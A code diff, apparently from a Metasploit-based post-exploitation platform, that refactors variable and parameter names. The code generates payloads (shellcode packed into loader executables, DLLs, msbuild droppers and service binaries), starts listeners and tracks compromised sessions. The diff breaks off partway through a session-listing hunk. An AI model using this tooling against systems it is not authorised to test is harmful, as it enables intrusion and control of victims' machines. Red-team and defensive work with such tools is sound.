@@ -28,14 +28,14 @@ from channels.layers import get_channel_layer
 from django.shortcuts import HttpResponse
 from jinja2 import Environment, FileSystemLoader
 
-from CONFIG import MSFLOOT, JSON_RPC_IP, JSON_RPC_PORT, RPC_TOKEN, MSFLOOTTRUE, DEBUG
+from CONFIG import MSFLOOT, RPC_TOKEN, MSFLOOTTRUE, DEBUG, JSON_RPC_URL
 from Core.configs import *
 from Core.lib import Xcache, list_data_return, dict_data_return, logger, Notices, RedisClient, Geoip, is_empty_ports
 from Msgrpc.serializers import SessionLibSerializer, PostModuleSerializer, BotModuleSerializer
 from PostModule.lib.Configs import HANDLER_OPTION
 
 
-class aescrypt(object):
+class Aescrypt(object):
     def __init__(self, key, model, iv, encode_):
         self.encode_ = encode_
         self.model = {'ECB': AES.MODE_ECB, 'CBC': AES.MODE_CBC}[model]
@@ -53,13 +53,13 @@ class aescrypt(object):
 
     def aesencrypt(self, text):
         text = self.add_16(text)
-        self.encrypt_text = self.aes.encrypt(text)
-        return base64.encodebytes(self.encrypt_text).decode().strip()
+        encrypt_text = self.aes.encrypt(text)
+        return base64.encodebytes(encrypt_text).decode().strip()
 
     def aesdecrypt(self, text):
         text = base64.decodebytes(text.encode(self.encode_))
-        self.decrypt_text = self.aes.decrypt(text)
-        return self.decrypt_text.decode(self.encode_).strip('\0')
+        decrypt_text = self.aes.decrypt(text)
+        return decrypt_text.decode(self.encode_).strip('\0')
 
 
 class Method(object):
@@ -211,10 +211,9 @@ class RpcClient(object):
                 return None
         json_data = json.dumps(data)
         try:
-            JSON_RPC_URL = "http://{}:{}/api/v1/json-rpc".format(JSON_RPC_IP, JSON_RPC_PORT)
             r = req_session.post(JSON_RPC_URL, headers=_headers, data=json_data, timeout=(1.05, timeout))
         except Exception as _:
-            logger.warning('msf连接失败,检查 {}:{} 是否可用'.format(JSON_RPC_IP, JSON_RPC_PORT))
+            logger.warning('msf连接失败,检查 {} 是否可用'.format(JSON_RPC_URL))
             return None
         if r.status_code == 200:
             content = json.loads(r.content.decode('utf-8', 'ignore'))
@@ -309,76 +308,76 @@ class APSModule(object):
 
     @staticmethod
     def store_executed_result(task_uuid=None):
-        req = Xcache.get_module_task_by_uuid(uuid=task_uuid)
+        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
         if req is None:
             logger.warning("缓存中无对应实例,可能已经模块已经中途退出")
             return False
-        postModuleRunMulitBase = req.get("module")
+        module_common_instance = req.get("module")
 
         # 存储运行结果
         try:
-            postModuleRunMulitBase.store_result_in_result_history()
+            module_common_instance.store_result_in_result_history()
             Notices.send_success(
-                "模块: {} {} 执行完成".format(postModuleRunMulitBase.NAME, postModuleRunMulitBase.target_str))
-            logger.warning("多模块实例执行完成:{}".format(postModuleRunMulitBase.NAME))
-            Xcache.del_module_task_by_uuid(uuid=task_uuid)  # 清理缓存信息
+                "模块: {} {} 执行完成".format(module_common_instance.NAME, module_common_instance.target_str))
+            logger.warning("多模块实例执行完成:{}".format(module_common_instance.NAME))
+            Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
             return True
         except Exception as E:
-            Xcache.del_module_task_by_uuid(uuid=task_uuid)  # 清理缓存信息
-            logger.error("多模块实例执行异常:{} 异常信息: {}".format(postModuleRunMulitBase.NAME, E))
-            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(postModuleRunMulitBase.NAME, E))
+            Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
+            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
+            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
             logger.error(E)
             return False
 
     @staticmethod
-    def store_error_result(uuid=None, exception=None):
-        req = Xcache.get_module_task_by_uuid(uuid=uuid)
-        Xcache.del_module_task_by_uuid(uuid=uuid)  # 清理缓存信息
-        postModuleRunMulitBase = req.get("module")
+    def store_error_result(task_uuid=None, exception=None):
+        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
+        Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
+        module_common_instance = req.get("module")
 
         # 存储运行结果
         try:
-            postModuleRunMulitBase.log_except(exception)
-            postModuleRunMulitBase.store_result_in_result_history()
-            logger.error("多模块实例执行异常:{} 异常信息: {}".format(postModuleRunMulitBase.NAME, exception))
-            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(postModuleRunMulitBase.NAME, exception))
+            module_common_instance.log_except(exception)
+            module_common_instance.store_result_in_result_history()
+            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, exception))
+            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, exception))
             return True
         except Exception as E:
-            logger.error("多模块实例执行异常:{} 异常信息: {}".format(postModuleRunMulitBase.NAME, E))
-            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(postModuleRunMulitBase.NAME, E))
+            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
+            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
             logger.error(E)
             return False
 
-    def delete_job_by_uuid(self, uuid=None):
-        req = Xcache.get_module_task_by_uuid(uuid=uuid)
-        Xcache.del_module_task_by_uuid(uuid=uuid)  # 清理缓存信息
+    def delete_job_by_uuid(self, task_uuid=None):
+        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
+        Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
 
         # 删除后台任务
         try:
-            self.ModuleJobsScheduler.remove_job(uuid)
+            self.ModuleJobsScheduler.remove_job(task_uuid)
         except Exception as E:
             logger.error(E)
 
         try:
-            postModuleRunMulitBase = req.get("module")
+            module_common_instance = req.get("module")
         except Exception as E:
             logger.error(E)
             return False
 
         # 存储已经生成的结果
         try:
-            postModuleRunMulitBase.log_status("用户手动删除任务")
-            postModuleRunMulitBase.store_result_in_result_history()
+            module_common_instance.log_status("用户手动删除任务")
+            module_common_instance.store_result_in_result_history()
         except Exception as E:
-            logger.error("删除多模块实例异常:{} 异常信息: {}".format(postModuleRunMulitBase.NAME, E))
-            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(postModuleRunMulitBase.NAME, E))
+            logger.error("删除多模块实例异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
+            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
             logger.error(E)
             return False
 
         # 发送通知
         Notices.send_info(
-            "模块: {} {} 手动删除".format(postModuleRunMulitBase.NAME, postModuleRunMulitBase.target_str))
-        logger.warning("多模块实例手动删除:{}".format(postModuleRunMulitBase.NAME))
+            "模块: {} {} 手动删除".format(module_common_instance.NAME, module_common_instance.target_str))
+        logger.warning("多模块实例手动删除:{}".format(module_common_instance.NAME))
         return True
 
 
@@ -393,9 +392,9 @@ class MSFModule(object):
         pass
 
     @staticmethod
-    def run(type=None, mname=None, opts=None, runasjob=False, timeout=1800):
+    def run(module_type=None, mname=None, opts=None, runasjob=False, timeout=1800):
         """实时运行MSF模块"""
-        params = [type,
+        params = [module_type,
                   mname,
                   opts,
                   runasjob,
@@ -464,7 +463,7 @@ class MSFModule(object):
 
         # 获取对应模块实例
         try:
-            req = Xcache.get_module_task_by_uuid(uuid=msf_module_return_dict.get("uuid"))
+            req = Xcache.get_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))
         except Exception as E:
             logger.error(E)
             return False
@@ -501,7 +500,7 @@ class MSFModule(object):
         except Exception as E:
             logger.error(E)
 
-        Xcache.del_module_task_by_uuid(uuid=msf_module_return_dict.get("uuid"))  # 清理缓存信息
+        Xcache.del_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))  # 清理缓存信息
         Notices.send_success("模块: {} {} 执行完成".format(module_intent.NAME, module_intent.target_str))
 
     @staticmethod
@@ -509,7 +508,7 @@ class MSFModule(object):
         body = message.get('data')
         try:
             msf_module_return_dict = json.loads(body)
-            req = Xcache.get_module_task_by_uuid(uuid=msf_module_return_dict.get("uuid"))
+            req = Xcache.get_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))
         except Exception as E:
             logger.error(E)
             return False
@@ -624,33 +623,33 @@ class Payload(object):
             # 生成原始payload
             tmp_type = opts.get("Format")
             opts["Format"] = "hex"
-            result = MSFModule.run(type="payload", mname=mname, opts=opts)
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
             if result is None:
                 context = dict_data_return(305, Payload_MSG.get(305), {})
                 return context
 
             byteresult = base64.b64decode(result.get('payload'))
-            filename = Payload._create_payload_with_loader(mname, byteresult, type=tmp_type)
+            filename = Payload._create_payload_with_loader(mname, byteresult, payload_type=tmp_type)
             # 读取新的zip文件内容
-            payloadFile = os.path.join(TMP_DIR, filename)
+            payloadfile = os.path.join(TMP_DIR, filename)
             if opts.get("HandlerName") is not None:
                 filename = f"{opts.get('HandlerName')}_{filename}"
-            byteresult = open(payloadFile, 'rb')
+            byteresult = open(payloadfile, 'rb')
         elif opts.get("Format") == "msbuild":
             # 生成原始payload
             opts["Format"] = "csharp"
-            result = MSFModule.run(type="payload", mname=mname, opts=opts)
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
             if result is None:
                 context = dict_data_return(305, Payload_MSG.get(305), {})
                 return context
             byteresult = base64.b64decode(result.get('payload'))
             filename = Payload._create_payload_use_msbuild(mname, byteresult)
             # 读取新的zip文件内容
-            payloadFile = os.path.join(TMP_DIR, filename)
-            byteresult = open(payloadFile, 'rb')
+            payloadfile = os.path.join(TMP_DIR, filename)
+            byteresult = open(payloadfile, 'rb')
         elif opts.get("Format") == "exe-src":
             opts["Format"] = "hex"
-            result = MSFModule.run(type="payload", mname=mname, opts=opts)
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
             if result is None:
                 context = dict_data_return(305, Payload_MSG.get(305), {})
                 return context
@@ -659,13 +658,13 @@ class Payload(object):
             filename = "{}.exe".format(int(time.time()))
         elif opts.get("Format") == "exe-src-service":
             opts["Format"] = "hex"
-            result = MSFModule.run(type="payload", mname=mname, opts=opts)
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
             if result is None:
                 context = dict_data_return(305, Payload_MSG.get(305), {})
                 return context
             byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
             byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
-                                                          type="REVERSE_HEX_AS_SERVICE")
+                                                          payload_type="REVERSE_HEX_AS_SERVICE")
             filename = "{}.exe".format(int(time.time()))
         else:
             file_suffix = {
@@ -690,7 +689,7 @@ class Payload(object):
                 "py": "py",
                 "python-reflection": "py",
             }
-            result = MSFModule.run(type="payload", mname=mname, opts=opts)
+            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
             if result is None:
                 context = dict_data_return(305, Payload_MSG.get(305), {})
                 return context
@@ -711,13 +710,13 @@ class Payload(object):
         return response
 
     @staticmethod
-    def _create_payload_by_mingw(mname=None, shellcode=None, type="REVERSE_HEX"):
-        if type == "REVERSE_HEX":
+    def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
+        if payload_type == "REVERSE_HEX":
             env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
             tpl = env.get_template('REVERSE_HEX.c')
             reverse_hex_str = bytes.decode(shellcode)[::-1]
             src = tpl.render(SHELLCODE_STR=reverse_hex_str)
-        elif type == "REVERSE_HEX_AS_SERVICE":
+        elif payload_type == "REVERSE_HEX_AS_SERVICE":
             env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
             tpl = env.get_template('REVERSE_HEX_AS_SERVICE.c')
             reverse_hex_str = bytes.decode(shellcode)[::-1]
@@ -737,71 +736,71 @@ class Payload(object):
         return byteresult
 
     @staticmethod
-    def _create_payload_with_loader(mname=None, result=None, type="exe-diy"):
+    def _create_payload_with_loader(mname=None, result=None, payload_type="exe-diy"):
         filename = "{}.zip".format(int(time.time()))
 
-        payloadFile = os.path.join(TMP_DIR, filename)
-        extraloaderFilePath = None
-        extraArcname = None
-        if type == "exe-diy":
+        payloadfile = os.path.join(TMP_DIR, filename)
+        extraloader_filepath = None
+        extra_arcname = None
+        if payload_type == "exe-diy":
             arcname = "loader.exe"
-            shellcodeFilename = "loader.ini"
+            shellcode_filename = "loader.ini"
             if mname.startswith('windows/x64'):
-                loaderFile = 'loader_x64.exe'
+                loaderfile = 'loader_x64.exe'
             elif mname.startswith('windows/meterpreter'):
-                loaderFile = 'loader_x86.exe'
+                loaderfile = 'loader_x86.exe'
             else:
                 raise Exception('unspport mname')
-        elif type == "dll-diy":
+        elif payload_type == "dll-diy":
             arcname = "loaderdll.dll"
-            shellcodeFilename = "loaderdll.ini"
+            shellcode_filename = "loaderdll.ini"
             if mname.startswith('windows/x64'):
-                loaderFile = 'DirectDLL_x64.dll'
+                loaderfile = 'DirectDLL_x64.dll'
             elif mname.startswith('windows/meterpreter'):
-                loaderFile = 'DirectDLL_x86.dll'
+                loaderfile = 'DirectDLL_x86.dll'
             else:
                 raise Exception('unspport mname')
-        elif type == "dll-mutex-diy":
+        elif payload_type == "dll-mutex-diy":
             arcname = "loaderdllmutex.dll"
-            shellcodeFilename = "loaderdllmutex.ini"
+            shellcode_filename = "loaderdllmutex.ini"
             if mname.startswith('windows/x64'):
-                loaderFile = 'MDSDLL_x64.dll'
+                loaderfile = 'MDSDLL_x64.dll'
                 extraloader = 'loader_x64.exe'
-                extraloaderFilePath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
-                extraArcname = "loaderdllmutex.exe"
+                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
+                extra_arcname = "loaderdllmutex.exe"
             elif mname.startswith('windows/meterpreter'):
-                loaderFile = 'MDSDLL_x86.dll'
+                loaderfile = 'MDSDLL_x86.dll'
                 extraloader = 'loader_x86.exe'
-                extraloaderFilePath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
-                extraArcname = "loaderdllmutex.exe"
+                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
+                extra_arcname = "loaderdllmutex.exe"
             else:
                 raise Exception('unspport mname')
-        elif type == "elf-diy":
+        elif payload_type == "elf-diy":
             arcname = "loader"
-            shellcodeFilename = "shellcode"
+            shellcode_filename = "shellcode"
             if mname.startswith('linux/x64'):
-                loaderFile = 'unix_sc'
+                loaderfile = 'unix_sc'
             elif mname.startswith('linux/x86'):
-                loaderFile = 'unix_sc_x86'
+                loaderfile = 'unix_sc_x86'
             else:
                 raise Exception('unspport mname')
         else:
             arcname = "loader.exe"
-            shellcodeFilename = "loader.ini"
+            shellcode_filename = "loader.ini"
             if mname.startswith('windows/x64'):
-                loaderFile = 'loader_x64.exe'
+                loaderfile = 'loader_x64.exe'
             elif mname.startswith('windows/meterpreter'):
-                loaderFile = 'loader_x86.exe'
+                loaderfile = 'loader_x86.exe'
             else:
                 raise Exception('unspport mname')
 
-        loaderFilePath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, loaderFile)
-        newZip = zipfile.ZipFile(payloadFile, 'w')
-        newZip.writestr(shellcodeFilename, data=result, compress_type=zipfile.ZIP_DEFLATED)
-        newZip.write(loaderFilePath, arcname=arcname, compress_type=zipfile.ZIP_DEFLATED)
-        if type == "dll-mutex-diy":
-            newZip.write(extraloaderFilePath, arcname=extraArcname, compress_type=zipfile.ZIP_DEFLATED)
-        newZip.close()
+        loader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, loaderfile)
+        new_zip = zipfile.ZipFile(payloadfile, 'w')
+        new_zip.writestr(shellcode_filename, data=result, compress_type=zipfile.ZIP_DEFLATED)
+        new_zip.write(loader_filepath, arcname=arcname, compress_type=zipfile.ZIP_DEFLATED)
+        if payload_type == "dll-mutex-diy":
+            new_zip.write(extraloader_filepath, arcname=extra_arcname, compress_type=zipfile.ZIP_DEFLATED)
+        new_zip.close()
         return filename
 
     @staticmethod
@@ -873,13 +872,13 @@ echo    ^</Task^>>>a.xml
 echo  ^</UsingTask^>>>a.xml
 echo ^</Project^>>>a.xml"""
 
-        payloadFile = os.path.join(TMP_DIR, filename)
+        payloadfile = os.path.join(TMP_DIR, filename)
 
-        newZip = zipfile.ZipFile(payloadFile, 'w')
-        newZip.writestr("cmd.bat", data=filedata, compress_type=zipfile.ZIP_DEFLATED)
+        new_zip = zipfile.ZipFile(payloadfile, 'w')
+        new_zip.writestr("cmd.bat", data=filedata, compress_type=zipfile.ZIP_DEFLATED)
         readmefilepath = os.path.join(settings.BASE_DIR, "STATICFILES", "STATIC", "msbuild.md")
-        newZip.write(readmefilepath, arcname="readme.md", compress_type=zipfile.ZIP_DEFLATED)
-        newZip.close()
+        new_zip.write(readmefilepath, arcname="readme.md", compress_type=zipfile.ZIP_DEFLATED)
+        new_zip.close()
         return filename
 
     @staticmethod
@@ -1023,21 +1022,21 @@ class Job(object):
             return False
 
     @staticmethod
-    def destroy_adv_job(uuid=None, job_id=None, broker=None):
+    def destroy_adv_job(task_uuid=None, job_id=None, broker=None):
         try:
             from PostModule.lib.ModuleTemplate import BROKER
             if broker == BROKER.post_python_job:
-                flag = aps_module.delete_job_by_uuid(uuid)
+                flag = aps_module.delete_job_by_uuid(task_uuid)
                 if flag is not True:
                     context = dict_data_return(304, Job_MSG.get(304), {})
                     return context
                 else:
-                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": uuid, "job_id": job_id})
+                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid, "job_id": job_id})
                     return context
             elif broker == BROKER.post_msf_job:
-                req = Xcache.get_module_task_by_uuid(uuid=uuid)
-                postModuleRunMulitBase = req.get("module")
-                Xcache.del_module_task_by_uuid(uuid)
+                req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
+                common_module_instance = req.get("module")
+                Xcache.del_module_task_by_uuid(task_uuid)
                 params = [job_id]
                 result = RpcClient.call(Method.JobStop, params)
                 if result is None:
@@ -1046,19 +1045,19 @@ class Job(object):
                 if result.get('result') == 'success':
                     # 发送通知
                     Notices.send_info(
-                        "模块: {} {} 手动删除完成".format(postModuleRunMulitBase.NAME, postModuleRunMulitBase.target_str))
-                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": uuid, "job_id": job_id})
+                        "模块: {} {} 手动删除完成".format(common_module_instance.NAME, common_module_instance.target_str))
+                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid, "job_id": job_id})
                     return context
                 else:
                     context = dict_data_return(304, Job_MSG.get(304), {})
                     return context
             elif broker == BROKER.bot_msf_job:
-                flag = Xcache.del_bot_wait_by_group_uuid(uuid)
+                flag = Xcache.del_bot_wait_by_group_uuid(task_uuid)
                 if flag is not True:
                     context = dict_data_return(304, Job_MSG.get(304), {})
                     return context
                 else:
-                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": uuid})
+                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid})
                     return context
             else:
                 context = dict_data_return(304, Job_MSG.get(304), {})
@@ -1112,28 +1111,28 @@ class Handler(object):
             if info.get('name') == 'Exploit: multi/handler':
                 datastore = info.get('datastore')
                 if datastore is not None:
-                    oneHandler = {'ID': jobid, 'PAYLOAD': None}
+                    one_handler = {'ID': jobid, 'PAYLOAD': None}
                     if datastore.get('PAYLOAD') is not None:
-                        oneHandler['PAYLOAD'] = datastore.get('PAYLOAD')
+                        one_handler['PAYLOAD'] = datastore.get('PAYLOAD')
 
                     elif datastore.get('Payload') is not None:
-                        oneHandler['PAYLOAD'] = datastore.get('Payload')
+                        one_handler['PAYLOAD'] = datastore.get('Payload')
                     elif datastore.get('payload') is not None:
-                        oneHandler['PAYLOAD'] = datastore.get('payload')
+                        one_handler['PAYLOAD'] = datastore.get('payload')
 
                     z = datastore.copy()
-                    z.update(oneHandler)
-                    oneHandler = z
-                    handlers.append(oneHandler)
+                    z.update(one_handler)
+                    one_handler = z
+                    handlers.append(one_handler)
         Xcache.set_cache_handlers(handlers)
         # 获取虚拟监听
         virtual_handlers = Xcache.get_virtual_handlers()
         handlers.extend(virtual_handlers)
 
         # 特殊参数处理
-        for oneHandler in handlers:
-            if oneHandler.get('StageEncoder') is not None and oneHandler.get('StageEncoder') != '':
-                oneHandler['EnableStageEncoding'] = True
+        for one_handler in handlers:
+            if one_handler.get('StageEncoder') is not None and one_handler.get('StageEncoder') != '':
+                one_handler['EnableStageEncoding'] = True
 
         return handlers
 
@@ -1263,7 +1262,7 @@ class Handler(object):
                 context = dict_data_return(500, CODE_MSG.get(500), {})
                 return context
 
-            result = MSFModule.run(type="exploit", mname="multi/handler", opts=opts, runasjob=True)
+            result = MSFModule.run(module_type="exploit", mname="multi/handler", opts=opts, runasjob=True)
 
             if isinstance(result, dict) is not True or result.get('job_id') is None:
                 opts['ID'] = None
@@ -1307,8 +1306,8 @@ class Handler(object):
     @staticmethod
     def create_virtual_handler(opts=None):
         """生成一个虚拟监听"""
-        oneHandler = opts
-        virtual_id = Xcache.add_virtual_handler(oneHandler)
+        one_handler = opts
+        virtual_id = Xcache.add_virtual_handler(one_handler)
 
         opts['ID'] = virtual_id
         return opts
@@ -1341,8 +1340,8 @@ class Session(object):
         if sessionid is None or sessionid <= 0:
             context = dict_data_return(304, Session_MSG.get(304), {})
             return context
-        sessionInterface = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
-        result = SessionLibSerializer(sessionInterface).data
+        session_interface = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
+        result = SessionLibSerializer(session_interface).data
         context = dict_data_return(200, CODE_MSG.get(200), result)
         return context
 
@@ -1352,8 +1351,8 @@ class Session(object):
             context = dict_data_return(304, Session_MSG.get(304), {})
             return context
         Xcache.set_session_info(sessionid, None)
-        sessionLib = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
-        result = SessionLibSerializer(sessionLib).data
+        session_lib = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
+        result = SessionLibSerializer(session_lib).data
         context = dict_data_return(203, Session_MSG.get(203), result)
         return context
 
@@ -1389,80 +1388,79 @@ class Session(object):
         info = RpcClient.call(Method.SessionGet, [sessionid], timeout=3)
         if info is not None:
 
-            oneSession = {}
-            oneSession['id'] = sessionid
+            one_session = {'id': sessionid}
             # 处理linux的no-user问题
             if str(info.get('info')).split(' @ ')[0] == "no-user":
                 info['info'] = info.get('info')[10:]
 
             try:
-                oneSession['user'] = str(info.get('info')).split(' @ ')[0]
-                oneSession['computer'] = str(info.get('info')).split(' @ ')[1]
+                one_session['user'] = str(info.get('info')).split(' @ ')[0]
+                one_session['computer'] = str(info.get('info')).split(' @ ')[1]
             except Exception as _:
-                oneSession['user'] = "Initializing"
-                oneSession['computer'] = "Initializing"
-                oneSession['type'] = info.get('type')
-                oneSession['session_host'] = info.get('session_host')
-                oneSession['tunnel_local'] = info.get('tunnel_local')
-                oneSession['tunnel_peer'] = info.get('tunnel_peer')
-                oneSession['via_exploit'] = info.get('via_exploit')
-                oneSession['via_payload'] = info.get('via_payload')
-                oneSession['info'] = info.get('info')
-                oneSession['arch'] = info.get('arch')
-                oneSession['platform'] = info.get('platform')
-                oneSession['last_checkin'] = info.get('last_checkin') // 10 * 10
-                oneSession['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
-                oneSession['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
-                oneSession['os'] = None
-                oneSession['os_short'] = None
-                oneSession['load_powershell'] = False
-                oneSession['load_python'] = False
-                oneSession['uuid'] = info.get('uuid')
-                oneSession['routes'] = []
-                oneSession['isadmin'] = False
-                oneSession['available'] = False  # 是否初始化完成
-                return oneSession
+                one_session['user'] = "Initializing"
+                one_session['computer'] = "Initializing"
+                one_session['type'] = info.get('type')
+                one_session['session_host'] = info.get('session_host')
+                one_session['tunnel_local'] = info.get('tunnel_local')
+                one_session['tunnel_peer'] = info.get('tunnel_peer')
+                one_session['via_exploit'] = info.get('via_exploit')
+                one_session['via_payload'] = info.get('via_payload')
+                one_session['info'] = info.get('info')
+                one_session['arch'] = info.get('arch')
+                one_session['platform'] = info.get('platform')
+                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
+                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
+                one_session['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
+                one_session['os'] = None
+                one_session['os_short'] = None
+                one_session['load_powershell'] = False
+                one_session['load_python'] = False
+                one_session['uuid'] = info.get('uuid')
+                one_session['routes'] = []
+                one_session['isadmin'] = False
+                one_session['available'] = False  # 是否初始化完成
+                return one_session
             else:
-                oneSession['type'] = info.get('type')
-                oneSession['session_host'] = info.get('session_host')
-                oneSession['tunnel_local'] = info.get('tunnel_local')
-                oneSession['tunnel_peer'] = info.get('tunnel_peer')
-                oneSession['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
-                oneSession['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
-                oneSession['via_exploit'] = info.get('via_exploit')
-                oneSession['via_payload'] = info.get('via_payload')
-                oneSession['info'] = info.get('info')
-                oneSession['arch'] = info.get('arch')
-                oneSession['platform'] = info.get('platform')
-                oneSession['last_checkin'] = info.get('last_checkin') // 10 * 10
-                oneSession['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
-                oneSession['advanced_info'] = info.get('advanced_info')
+                one_session['type'] = info.get('type')
+                one_session['session_host'] = info.get('session_host')
+                one_session['tunnel_local'] = info.get('tunnel_local')
+                one_session['tunnel_peer'] = info.get('tunnel_peer')
+                one_session['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
+                one_session['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
+                one_session['via_exploit'] = info.get('via_exploit')
+                one_session['via_payload'] = info.get('via_payload')
+                one_session['info'] = info.get('info')
+                one_session['arch'] = info.get('arch')
+                one_session['platform'] = info.get('platform')
+                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
+                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
+                one_session['advanced_info'] = info.get('advanced_info')
                 try:
-                    oneSession['os'] = info.get('advanced_info').get("sysinfo").get("OS")
-                    oneSession['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
+                    one_session['os'] = info.get('advanced_info').get("sysinfo").get("OS")
+                    one_session['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
                 except Exception as _:
-                    oneSession['os'] = None
-                    oneSession['os_short'] = None
-                oneSession['load_powershell'] = info.get('load_powershell')
-                oneSession['load_python'] = info.get('load_python')
-                oneSession['uuid'] = info.get('uuid')
+                    one_session['os'] = None
+                    one_session['os_short'] = None
+                one_session['load_powershell'] = info.get('load_powershell')
+                one_session['load_python'] = info.get('load_python')
+                one_session['uuid'] = info.get('uuid')
                 try:
-                    oneSession['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")
+                    one_session['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")
                 except Exception as _:
-                    oneSession['isadmin'] = None
+                    one_session['isadmin'] = None
 
                 routestrlist = info.get('routes')
                 try:
-                    oneSession['routes'] = []
+                    one_session['routes'] = []
                     if isinstance(routestrlist, list):
                         for routestr in routestrlist:
                             routestr.split('/')
                             tmpdict = {"subnet": routestr.split('/')[0], 'netmask': routestr.split('/')[1]}
-                            oneSession['routes'].append(tmpdict)
+                            one_session['routes'].append(tmpdict)
                 except Exception as E:
                     logger.error(E)
-                oneSession['available'] = True
-                return oneSession
+                one_session['available'] = True
+                return one_session
         else:
             return None
 
@@ -1481,9 +1479,9 @@ class Session(object):
         for key in infos.keys():
             info = infos.get(key)
             if info is not None:
-                oneSession = {}
+                one_session = {}
                 try:
-                    oneSession['id'] = int(key)
+                    one_session['id'] = int(key)
                 except Exception as E:
                     logger.warning(E)
                     continue
@@ -1492,95 +1490,93 @@ class Session(object):
                     info['info'] = info.get('info')[10:]
 
                 try:
-                    oneSession['user'] = str(info.get('info')).split(' @ ')[0]
-                    oneSession['computer'] = str(info.get('info')).split(' @ ')[1]
+                    one_session['user'] = str(info.get('info')).split(' @ ')[0]
+                    one_session['computer'] = str(info.get('info')).split(' @ ')[1]
                 except Exception as _:
-                    oneSession['user'] = "Initializing"
-                    oneSession['computer'] = "Initializing"
-                    oneSession['type'] = info.get('type')
-                    oneSession['session_host'] = info.get('session_host')
+                    one_session['user'] = "Initializing"
+                    one_session['computer'] = "Initializing"
+                    one_session['type'] = info.get('type')
+                    one_session['session_host'] = info.get('session_host')
                     sessionhosts.append(info.get('session_host'))
-                    oneSession['tunnel_local'] = info.get('tunnel_local')
-                    oneSession['tunnel_peer'] = info.get('tunnel_peer')
-                    oneSession['via_exploit'] = info.get('via_exploit')
-                    oneSession['via_payload'] = info.get('via_payload')
-                    oneSession['info'] = info.get('info')
-                    oneSession['arch'] = info.get('arch')
-                    oneSession['platform'] = info.get('platform')
-                    oneSession['last_checkin'] = info.get('last_checkin') // 10 * 10
-                    oneSession['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
-                    oneSession['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
-                    oneSession['os'] = None
-                    oneSession['load_powershell'] = False
-                    oneSession['load_python'] = False
-                    oneSession['uuid'] = info.get('uuid')
-                    oneSession['routes'] = []
-                    oneSession['isadmin'] = False
